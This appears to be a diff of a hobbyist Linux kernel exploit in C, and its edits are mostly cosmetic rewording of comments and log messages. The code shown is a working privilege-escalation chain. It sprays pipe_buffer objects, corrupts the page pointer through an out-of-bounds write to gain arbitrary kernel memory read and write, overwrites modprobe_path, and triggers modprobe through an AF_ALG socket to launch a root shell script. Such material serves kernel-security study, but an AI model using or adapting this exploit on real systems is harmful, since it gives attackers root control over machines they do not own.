@@ -1,12 +1,11 @@
 /*
  * Funny experiments with Linux kernel exploitation:
- * a basic out-of-bounds write exploit performs out-of-bounds write
- * to overwrite `pipe_buffer`->page pointer with arbitrary value,
- * allowing the attacker to write and read arbitrary memory.
+ * a basic out-of-bounds writing exploit corrupting the `pipe_buffer.page` pointer
+ * to perform arbitrary address reading and writing (AARW) of kernel memory via a pipe.
  *
  * Only basic methods. Just for fun.
  *
- * 1) Use Linux kernel version tagged as `v6.18` (7d0a66e4bb9081d75c82ec4957c50034cb0ea449)
+ * 1) Use Linux kernel version v6.18 tag (7d0a66e4bb9081d75c82ec4957c50034cb0ea449)
  *
  * 2) Use gcc version 13.3.0
  *
@@ -60,10 +59,10 @@ void trigger_modprobe_sock(void)
 	struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "dummy" };
 	int alg_fd = -1;
 
-	printf("[!] Triggering modprobe using AF_ALG socket to launch the root shell...\n");
+	printf("[!] triggering modprobe using AF_ALG socket to launch the root shell...\n");
 	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
 	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
-	printf("[!] Root shell is finished\n");
+	printf("[!] root shell is finished\n");
 
 	if (alg_fd >= 0) {
 		if (close(alg_fd) < 0)
@@ -102,7 +101,6 @@ int prepare_privesc_script(char *path, size_t path_size, char *modprobe_path)
 		      "echo \"%s\" > /proc/sys/kernel/modprobe\n"
 		      "/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n",
 		      modprobe_path, pid, shell_stdin_fd, pid, shell_stdout_fd);
-
 	if (ret < 0) {
 		perror("[-] dprintf for privesc_script");
 		return EXIT_FAILURE;
@@ -214,13 +212,14 @@ int act(int act_fd, int code, int n, char *args)
 
 int main(void)
 {
+	int ret = EXIT_FAILURE;
+	char modprobe_path[KMOD_PATH_LEN] = { 0 };
+	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
+	int act_fd = -1;
 	bool success = false;
 	char err_act[64];
-	char modprobe_path[KMOD_PATH_LEN] = { 0 };
 	char pipe_data[PIPE_CAPACITY];
-	char privesc_script_path[KMOD_PATH_LEN] = { 0 };
-	int act_fd = -1, pipe_ret = -1;
-	int ret = EXIT_FAILURE;
+	int pipe_ret = -1;
 	int pipe_fds[PIPES_N][2];
 
 	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
@@ -249,7 +248,7 @@ int main(void)
 			goto end;
 		}
 	}
-	printf("[+] Opened pipes\n");
+	printf("[+] opened pipes\n");
 
 	memset(pipe_data, 0, sizeof(pipe_data));
 
@@ -274,9 +273,9 @@ int main(void)
 			goto end;
 		}
 	}
-	printf("[+] Sprayed pipe_buffers in kmalloc-96\n");
+	printf("[+] sprayed pipe_buffers in kmalloc-96\n");
 
-	printf("[*] Trying to corrupt `pipe_buffer`...\n");
+	printf("[*] trying to corrupt `pipe_buffer`...\n");
 	for (int d = 0; d < PIPES_N; d++) {
 		snprintf(err_act, sizeof(err_act), "3 %d 0x%lx 0x50", d,
 			 VIRTUAL_TO_PAGE(MODPROBE_PTR));
@@ -286,7 +285,7 @@ int main(void)
 			goto end;
 		}
 
-		printf("[*] Trying to leak modprobe_path...\n");
+		printf("[*] trying to leak modprobe_path...\n");
 		for (int i = 0; i < PIPES_N; i++) {
 			ret = read(pipe_fds[i][0], pipe_data, sizeof(pipe_data));
 			if (ret < 0) {
@@ -296,7 +295,7 @@ int main(void)
 			for (int j = 0; j <= (sizeof(pipe_data) - sizeof(modprobe_path)); j += 8) {
 				/* clang-format off */
 				if (memcmp(pipe_data + j, modprobe_path, sizeof(modprobe_path)) == 0) {
-					printf("[+] Located \"%s\" at offset 0x%lx of pipe #%d\n",
+					printf("[+] located \"%s\" at offset 0x%lx of pipe #%d\n",
 					       modprobe_path, (unsigned long)j, i);
 					memcpy(pipe_data + j, privesc_script_path,
 					       sizeof(privesc_script_path));
@@ -325,18 +324,18 @@ int main(void)
 		if (success)
 			break;
 		else
-			printf("[-] Unable to leak modprobe_path. Trying again!\n");
+			printf("[-] unable to leak modprobe_path. Trying again!\n");
 	}
 
 	if (!success) {
-		printf("[-] Unable to leak modprobe_path");
+		printf("[-] unable to leak modprobe_path");
 		goto end;
 	}
 
 	ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
 	if (ret == EXIT_FAILURE)
 		goto end;
-	printf("[+] Overwrote modprobe_path successfully: \"%s\"\n", modprobe_path);
+	printf("[+] overwrote modprobe_path successfully: \"%s\"\n", modprobe_path);
 
 	trigger_modprobe_sock();
 	ret = EXIT_SUCCESS;
@@ -364,10 +363,10 @@ end:
 	}
 
 	if (ret == EXIT_FAILURE) {
-		printf("\n[-] Exploit failed!\n");
+		printf("\n[-] exploit failed!\n");
 		return ret;
 	} else {
-		printf("\n[+] The end! \n");
+		printf("\n[+] the end! \n");
 		return ret;
 	}
 }
